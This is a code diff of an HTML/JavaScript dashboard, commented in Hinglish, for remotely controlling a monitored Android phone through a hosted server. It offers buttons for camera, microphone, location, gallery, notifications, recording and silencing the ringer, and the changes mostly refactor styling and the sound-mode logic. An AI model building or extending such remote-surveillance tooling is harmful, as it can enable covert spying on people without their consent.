@@ -14,6 +14,7 @@
             --text-muted: #aaaaaa;
             --accent: #4caf50;
             --offline: #ff4444;
+            --cyan: #00f3ff;
         }
         body {
             background-color: var(--bg-color);
@@ -30,7 +31,7 @@
             border: 1px solid var(--glass-border);
         }
         .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
-        .device-name { font-size: 1.1rem; font-weight: bold; text-transform: uppercase; color: #00f3ff; }
+        .device-name { font-size: 1.1rem; font-weight: bold; text-transform: uppercase; color: var(--cyan); }
         .status-badge {
             background: #222; padding: 5px 12px; border-radius: 20px;
             font-size: 0.75rem; display: flex; align-items: center; gap: 8px;
@@ -64,8 +65,8 @@
         .control-btn span { font-size: 0.6rem; text-align: center; color: #bbb; }
         
         .id-display { 
-            margin-bottom: 15px; font-size: 0.8rem; color: #00f3ff; cursor: pointer; 
-            border: 1px dashed #00f3ff; padding: 8px 20px; border-radius: 12px;
+            margin-bottom: 15px; font-size: 0.8rem; color: var(--cyan); cursor: pointer; 
+            border: 1px dashed var(--cyan); padding: 8px 20px; border-radius: 12px;
             background: rgba(0, 243, 255, 0.05);
         }
     </style>
@@ -116,11 +117,13 @@
             <a href="#" onclick="openView('camera')" class="control-btn"><i class="fa-solid fa-camera"></i><span>Camera</span></a>
             <a href="#" onclick="openView('audio')" class="control-btn"><i class="fa-solid fa-microphone"></i><span>Audio</span></a>
             <a href="#" onclick="openView('location')" class="control-btn"><i class="fa-solid fa-location-dot"></i><span>Location</span></a>
+            
             <a href="#" onclick="openView('gallery')" class="control-btn"><i class="fa-solid fa-images"></i><span>Gallery</span></a>
+            
             <a href="#" onclick="openView('notifications')" class="control-btn"><i class="fa-regular fa-message"></i><span>Notify</span></a>
             
             <div class="control-btn" id="soundBtn" onclick="cycleSoundMode()">
-                <i class="fa-solid fa-bell" id="soundIcon"></i><span id="soundText">Sound</span>
+                <i class="fa-solid fa-bell" id="soundIcon"></i><span id="soundText">Normal</span>
             </div>
 
             <div class="control-btn" onclick="sendCommand('rec_start')"><i class="fa-solid fa-circle-dot"></i><span>Rec</span></div>
@@ -135,35 +138,28 @@
 
     <script>
         const API_BASE = 'https://child-v9no.onrender.com';
-        
-        // 1. LocalStorage se ID load karna (Ak baar dali, hamesha rahegi)
         let DEVICE_ID = localStorage.getItem('monitoring_id') || '';
 
         function askID() {
             let id = prompt("Phone App mein dikhne waali ID dalo:", DEVICE_ID);
             if (id && id.trim() !== "") {
-                DEVICE_ID = id.trim();
-                localStorage.setItem('monitoring_id', DEVICE_ID); // Memory mein save
+                DEVICE_ID = id.trim().toUpperCase();
+                localStorage.setItem('monitoring_id', DEVICE_ID);
                 document.getElementById('currentID').innerText = DEVICE_ID;
                 updateDashboard();
             }
         }
 
         function updateDashboard() {
-            if (!DEVICE_ID) {
-                document.getElementById('currentID').innerText = "Click to set ID";
-                return;
-            }
+            if (!DEVICE_ID) return;
             document.getElementById('currentID').innerText = DEVICE_ID;
 
-            // Naye Server Logic ke hisaab se call
             fetch(`${API_BASE}/api/device-status/${DEVICE_ID}`)
                 .then(res => res.json())
                 .then(data => {
-                    if(data.id || data.lastSeen) {
-                        // Agar server par model name hai toh wo dikhao, nahi toh ID
+                    if(data.id) {
                         document.getElementById('deviceName').innerText = data.model || DEVICE_ID;
-                        document.getElementById('androidVer').innerText = data.version ? "V" + data.version : "--";
+                        document.getElementById('androidVer').innerText = data.version || "--";
                         
                         const dot = document.getElementById('statusDot');
                         const statusText = document.getElementById('statusText');
@@ -184,21 +180,14 @@
                         document.getElementById('batteryPercent').innerText = battery + "%";
                         document.getElementById('batteryFill').style.width = battery + "%";
                         document.getElementById('batteryStatus').innerText = data.charging ? "⚡ Charging..." : "🔋 On Battery";
-                    } else {
-                        document.getElementById('statusText').innerText = "Not Found";
-                        document.getElementById('deviceName').innerText = "Unknown Device";
                     }
                 })
-                .catch(err => {
-                    console.error("Fetch error");
-                    document.getElementById('statusText').innerText = "Offline";
-                });
+                .catch(err => console.error("Update Error"));
         }
 
-        // Feature page pe ID lekar jana
         function openView(page) {
             if(!DEVICE_ID) return askID();
-            // URL mein ID pass karna zaroori hai
+            // Gallery ya kisi bhi page par jane se pehle ID verify ho chuki hai
             window.location.href = `view_${page}.html?id=${DEVICE_ID}`;
         }
 
@@ -208,38 +197,40 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ device_id: DEVICE_ID, command: action })
-            }).then(() => console.log("Command sent:", action));
+            })
+            .then(res => res.json())
+            .then(data => {
+                console.log("Sent:", action);
+                // Simple UI feedback
+                const soundBtn = document.getElementById('soundBtn');
+                soundBtn.style.borderColor = "var(--cyan)";
+                setTimeout(() => soundBtn.style.borderColor = "var(--glass-border)", 500);
+            });
         }
 
-        let currentMode = 0;
+        // Sound Cycle Logic
+        let modes = ['normal', 'vibrate', 'silent'];
+        let icons = ['fa-bell', 'fa-vibration', 'fa-bell-slash'];
+        let labels = ['Normal', 'Vibrate', 'Silent'];
+        let currentModeIndex = 0;
+
         function cycleSoundMode() {
+            currentModeIndex = (currentModeIndex + 1) % 3;
+            
             const icon = document.getElementById('soundIcon');
             const text = document.getElementById('soundText');
-            currentMode = (currentMode + 1) % 3;
             
-            if(currentMode === 0) { 
-                icon.className = "fa-solid fa-bell"; text.innerText = "Normal"; 
-                sendCommand('normal'); 
-            }
-            else if(currentMode === 1) { 
-                icon.className = "fa-solid fa-vibration"; text.innerText = "Vibrate"; 
-                sendCommand('vibrate'); 
-            }
-            else { 
-                icon.className = "fa-solid fa-bell-slash"; text.innerText = "Silent"; 
-                sendCommand('silent'); 
-            }
+            icon.className = `fa-solid ${icons[currentModeIndex]}`;
+            text.innerText = labels[currentModeIndex];
+            
+            sendCommand(modes[currentModeIndex]);
         }
 
-        // Har 5 second mein update
         setInterval(updateDashboard, 5000);
         
         window.onload = () => {
-            if(DEVICE_ID) {
-                updateDashboard();
-            } else {
-                askID();
-            }
+            if(DEVICE_ID) updateDashboard();
+            else askID();
         };
     </script>
 </body>
